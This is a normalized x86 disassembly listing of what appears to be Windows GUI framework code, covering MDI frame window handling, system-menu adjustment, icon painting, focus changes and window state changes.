add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4617d8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_45071c
push eax
call SendMessageA
mov eax ebx
call sub_464d84
push eax
push 0x1
push 0x80
mov eax ebx
call sub_45071c
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_449824
push eax
mov eax ebx
call sub_449868
push eax
mov eax ebx
call sub_45071c
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406b6c
mov [ ebx + 0x254 ] eax
push ebx
push sub_463370
call sub_42205c
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_45a0f4
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_45071c
push eax
call SetWindowPos
jmp r-xdata
sub_464572
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46469d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_44d8a4
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_466a90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4646a4
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_4646ac
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_44db10
push 0x0
mov eax ebx
call sub_45071c
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_4646f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44e294
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_45071c
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_45071c
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_464754
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4647fc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464803
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax edi
call sub_460ae8
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403350
mov eax ebx
call sub_464b0c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403350
test al al
jne r-xdata
sub_46480c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_44d1f8
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_44d1f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_464754
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_464854
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_464754
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_464878
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_41874c
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_41862c
mov eax edi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_41874c
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_41862c
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_464ae8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_45071c
mov dx 0xb000
call sub_460894
test al al
jne r-xdata
call sub_45071c
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_460894
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464aef
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_4039b4
jmp r-xdata
call sub_4039b4
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_44d1f8
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_45071c
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_460894
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_44afd4
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
call sub_4039b4
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_45071c
mov dx 0xb01a
call sub_460894
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_4039b4
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_44afd4
sub_464b0c
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_44afd4
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_45071c
push eax
call SetFocus
mov eax ebx
call sub_45071c
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_464b5c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_44afd4
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_464c10
mov eax esi
call sub_464b0c
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_450b44
mov edx eax
mov eax esi
call sub_464754
sub_464bc0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4637d8
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_44afd4
mov eax ebx
call sub_4637d8
mov edx esi
call sub_464bc0
sub_464c10
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_45dc20
mov edx esi
call sub_45dc04
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_464cb8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_45071c
push eax
call SendMessageA
sub_464d04
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_464cb8
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_464d34
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_464cb8
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_464da0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_424c0c
xor eax eax
push ebp
push sub_464e4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_425038
xor eax eax
push ebp
push sub_464e2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403350
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e32
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_425038
retn
sub_464e5c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_4637d8
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_46380c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403350
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_44f9e4
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_463858
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403350
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_464efc
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_45071c
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_45071c
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_464d84
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_45071c
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_44e8ac
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_464f7a
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_424828
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_464fdc
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45071c
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_44eb70
pop edi
pop esi
retn
sub_465028
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45071c
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_465124
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_463b4c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_465028
pop ecx
sub_465158
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44b4f0
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45071c
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_45071c
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_45071c
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_44a4c8
pop esi
pop ebx
retn
sub_4651e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_45071c
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_44f970
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_45071c
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_45d640
sub_465248
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ea0c
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_45d054
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_465294
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_45d8b4
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4652cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_465367
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46536e
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_45cfb4
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46a088
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_446f84
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46a088
jmp r-xdata
sub_465394
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403350
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_4653d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cc80
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_465400
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_464bc0
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_446d5c
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_465458
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44f854
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_468a3c
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403350
sub_4654e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_45071c
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_45071c
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_45071c
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_46557c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45071c
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_464b5c
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403350
sub_4655d4
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_450c50
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_465600
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_464bc0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_46561c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_45cfe4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_45cfe4
sub_46565c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_465694
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403fa4
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4656c8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_465819
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465820
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_46561c
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
